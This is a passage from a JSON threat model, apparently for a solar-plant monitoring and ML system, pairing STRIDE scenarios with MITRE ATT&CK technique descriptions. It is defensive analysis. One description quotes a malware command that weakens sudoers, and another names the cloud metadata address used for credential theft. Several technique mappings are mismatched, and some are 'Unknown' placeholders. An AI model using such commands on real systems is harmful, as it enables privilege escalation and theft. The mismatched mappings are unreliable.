                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor spoofs the Receiver, sending malformed data to disrupt ML model training.",
            "Assumptions": [
                {
                    "Assumption": "Receiver does not have strict validation for incoming data.",
                    "Role": "Attacker",
                    "Condition": "Weak input validation and filtering."
                },
                {
                    "Assumption": "Network used to transmit data is compromised.",
                    "Role": "Attacker",
                    "Condition": "Network security measures are insufficient."
                },
                {
                    "Assumption": "Attacker can identify and emulate the Receiver's communication protocol.",
                    "Role": "Attacker",
                    "Condition": "Protocol details are known or guessable."
                }
            ],
            "Potential Impact": "Data Integrity Compromised - Malformed data could degrade the performance and accuracy of AI/ML models.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "input validation",
                "protocol"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious code injection into the Data Logger firmware.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update mechanisms are insecure.",
                    "Role": "Attacker",
                    "Condition": "Lack of validation checks for firmware updates."
                },
                {
                    "Assumption": "Attacker has the ability to access and write to the firmware.",
                    "Role": "Attacker",
                    "Condition": "Firmware is not write-protected."
                },
                {
                    "Assumption": "Insufficient monitoring of device integrity.",
                    "Role": "Attacker",
                    "Condition": "No regular or automated integrity checks."
                }
            ],
            "Potential Impact": "Data Integrity Compromised - Altered firmware could collect false data or malfunction.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "code injection",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data as it transits between the Data Logger and Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Communication lacks transport layer security."
                },
                {
                    "Assumption": "Attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Weak or no network access controls."
                },
                {
                    "Assumption": "No integrity checks upon data receipt.",
                    "Role": "Attacker",
                    "Condition": "Receiver trusts incoming data without validation."
                }
            ],
            "Potential Impact": "Data Integrity and Availability Compromised - Inaccurate data affects system operations and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data interception",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "ML model parameters are tampered with during the training process.",
            "Assumptions": [
                {
                    "Assumption": "Model training environment is accessible to unauthorized users.",
                    "Role": "Attacker",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Insufficient configuration management.",
                    "Role": "Attacker",
                    "Condition": "Lack of configuration and change management processes."
                },
                {
                    "Assumption": "No integrity verification of the training environment or data.",
                    "Role": "Attacker",
                    "Condition": "No integrity checks for the training environment or input data."
                }
            ],
            "Potential Impact": "Data Integrity Compromised - Tampered models produce unreliable predictions, affecting system operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "AI/ML",
                "model training",
                "configuration management"
            ],
            "mitre_technique": {
                "name": "Software Deployment Tools",
                "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
                "id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414",
                "technique_id": "T1072"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Anomalies in data are contested without transaction logs.",
            "Assumptions": [
                {
                    "Assumption": "System lacks comprehensive logging.",
                    "Role": "Administrator/User",
                    "Condition": "Logging is not enabled or is incomplete."
                },
                {
                    "Assumption": "No secure time stamps on logs.",
                    "Role": "Administrator/User",
                    "Condition": "Logs do not have tamper-proof time stamps."
                },
                {
                    "Assumption": "No centralized log storage.",
                    "Role": "Administrator/User",
                    "Condition": "Logs are stored only locally and are vulnerable to tampering."
                }
            ],
            "Potential Impact": "Data Integrity and Accountability Compromised - False data can be inserted or legitimate data removed without trace.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "anomaly detection",
                "audit"
            ],
            "mitre_technique": {
                "name": "Sudo Caching",
                "description": "The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code> that is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nAdversaries can abuse poor configurations of this to escalate privileges without needing the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. When <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user. \n\nThe OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--2169ba87-1146-4fc7-a118-12b72251db7e",
                "technique_id": "T1206"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Dashboard activity is disputed by employees.",
            "Assumptions": [
                {
                    "Assumption": "User actions are not logged.",
                    "Role": "Administrator/User",
                    "Condition": "Lack of activity logging on the Dashboard."
                },
                {
                    "Assumption": "Log data is not integrity protected.",
                    "Role": "Administrator/User",
                    "Condition": "Logs are susceptible to tampering or are unenforced."
                },
                {
                    "Assumption": "Logs are not monitored regularly.",
                    "Role": "Administrator/User",
                    "Condition": "Log review is infrequent or neglected."
                }
            ],
            "Potential Impact": "Accountability Compromised - Users can deny actions taken, leading to operational uncertainties.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "activity logging",
                "user actions",
                "audit logs"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Machine learning model changes or training data alterations are disputed.",
            "Assumptions": [
                {
                    "Assumption": "No version control for model and training data.",
                    "Role": "Administrator/User",
                    "Condition": "Changes are not logged or tracked."
                },
                {
                    "Assumption": "No provenance data for training datasets.",
                    "Role": "Administrator/User",
                    "Condition": "Datasets lack origin and change tracking information."
                },
                {
                    "Assumption": "Lack of audit trails for model training.",
                    "Role": "Administrator/User",
                    "Condition": "Training processes are not fully logged and auditable."
                }
            ],
            "Potential Impact": "Data Integrity and Accountability Compromised - Training data and model changes can be disputed or falsified, impacting system reliability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "version control",
                "audit trails",
                "model training"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Intercepted sensor data reveals operational secrets.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is unencrypted.",
                    "Role": "Attacker",
                    "Condition": "Communication channels lack encryption."
                },
                {
                    "Assumption": "Easy access to network traffic.",
                    "Role": "Attacker",
                    "Condition": "Weak network security measures."
                },
                {
                    "Assumption": "No real-time monitoring for unauthorized access.",
                    "Role": "Administrator",
                    "Condition": "Lack of network traffic monitoring and alerting."
                }
            ],
            "Potential Impact": "Confidentiality Compromised - Sensitive operational data could be accessed by unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network traffic",
                "encryption",
                "sensor data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Dashboard compromised to expose sensitive metadata of solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Lack of access control for sensitive data sections on the Dashboard.",
                    "Role": "Administrator",
                    "Condition": "Dashboard security settings are misconfigured."
                },
                {
                    "Assumption": "Weak authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Weak or absent multi-factor authentication."
                },
                {
                    "Assumption": "Improper session management.",
                    "Role": "Administrator",
                    "Condition": "Sessions are not managed securely, making them susceptible to hijacking."
                }
            ],
            "Potential Impact": "Confidentiality Compromised - Sensitive metadata may be exposed to unauthorized users, putting operational security at risk.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "dashboard",
                "metadata",
                "access control"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Anonymity agent fails, leading to the exposure of sensitive pre-processed data.",
            "Assumptions": [
                {
                    "Assumption": "Anon Agent processing has vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Known or unknown flaws in the processing logic."
                },
                {
                    "Assumption": "Unauthorized access to the Anonymity Agent.",
                    "Role": "Attacker",
                    "Condition": "Weak authentication or access control on the Anonymity Agent."
                },
                {
                    "Assumption": "No monitoring for data leaks.",
                    "Role": "Administrator",
                    "Condition": "Lack of monitoring mechanisms to detect data leaks."
                }
            ],
            "Potential Impact": "Confidentiality Compromised - Personal or sensitive data could be retained and inadvertently exposed.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "anonymity",
                "pre-processed data",
                "data leaks"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flood the sensor network with malicious traffic to prevent telemetry collection.",
            "Assumptions": [
                {
                    "Assumption": "Sensor network lacks rate limiting.",
                    "Role": "Attacker",
                    "Condition": "No rate limiting on network interfaces."
                },
                {
                    "Assumption": "Insufficient network segregation.",
                    "Role": "Administrator",
                    "Condition": "Flat network architecture without segmented zones."
                },
                {
                    "Assumption": "No defensive mechanism for mitigating flood attacks.",
                    "Role": "Administrator",
                    "Condition": "Lack of DDoS mitigation strategies."
                }
            ],
            "Potential Impact": "Availability Compromised - Inability to collect real-time data affecting maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "sensor network",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overload the Dashboard with requests to render it unusable.",
            "Assumptions": [
                {
                    "Assumption": "Absence of web application firewall (WAF).",
                    "Role": "Administrator",
                    "Condition": "No WAF in place to filter malicious traffic."
                },
                {
                    "Assumption": "Weak server load management.",
                    "Role": "Administrator",
                    "Condition": "Inadequate server resources or scaling policies."
                },
                {
                    "Assumption": "No rate limiting on the Dashboard.",
                    "Role": "Administrator",
                    "Condition": "Lack of measures to limit access rate per IP/user."
                }
            ],
            "Potential Impact": "Availability Compromised - Dashboard becomes inoperative, preventing access to system insights.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "web application",
                "rate limiting",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Interrupt data flow from Data Logger to Receiver via network disruptions.",
            "Assumptions": [
                {
                    "Assumption": "No redundancy for data transmission paths.",
                    "Role": "Administrator",
                    "Condition": "Single point of failure for data paths."
                },
                {
                    "Assumption": "Absence of network failover mechanisms.",
                    "Role": "Administrator",
                    "Condition": "Lack of automatic failover strategies."
                },
                {
                    "Assumption": "Network paths are vulnerable to interception and disruption.",
                    "Role": "Attacker",
                    "Condition": "Unsecured or vulnerable network paths."
                }
            ],
            "Potential Impact": "Availability Compromised - Missing data disrupts AI/ML model functioning.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network disruption",
                "data flow",
                "redundancy"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploit vulnerabilities in the Data Logger firmware to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "Known or unknown firmware vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Presence of exploitable bugs in firmware."
                },
                {
                    "Assumption": "Weak or absent access controls.",
                    "Role": "Administrator",
                    "Condition": "Insufficient access restrictions on firmware operations."
                },
                {
                    "Assumption": "No regular firmware updates or patches.",
                    "Role": "Administrator",
                    "Condition": "Outdated firmware without security patches."
                }
            ],
            "Potential Impact": "Confidentiality, Integrity, and Availability Compromised - Full control over Data Logger, possible data theft or manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "firmware",
                "root access",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Gain administrative access to the Dashboard through a client-side vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Presence of client-side scripting vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Existence of XSS or similar vulnerabilities."
                },
                {
                    "Assumption": "No input validation or output encoding on the Dashboard.",
                    "Role": "Administrator",
                    "Condition": "Hierarchical misconfiguration."
                },
                {
                    "Assumption": "Users operate with higher privileges than necessary.",
                    "Role": "Administrator",
                    "Condition": "Ineffective role-based access control."
                }
            ],
            "Potential Impact": "Confidentiality, Integrity, and Availability Compromised - Unauthorized users can manipulate Dashboard data and settings.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "web application",
                "client-side script",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of weak API endpoints within the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "API endpoints lack strong access controls.",
                    "Role": "Administrator",
                    "Condition": "APIs are not secured with robust authentication measures."
                },
                {
                    "Assumption": "Presence of injection vulnerabilities in API.",
                    "Role": "Attacker",
                    "Condition": "API is susceptible to SQL, command, or code injection."
                },
                {
                    "Assumption": "No regular API security auditing and testing.",
                    "Role": "Administrator",
                    "Condition": "API endpoints not routinely tested for vulnerabilities."
                }
            ],
            "Potential Impact": "Confidentiality, Integrity, and Availability Compromised - Unauthorized access to modify or extract data from the TOREADOR Platform.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "API security",
                "injection",
                "access control"
            ],
            "mitre_technique": {
                "name": "Process Injection",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
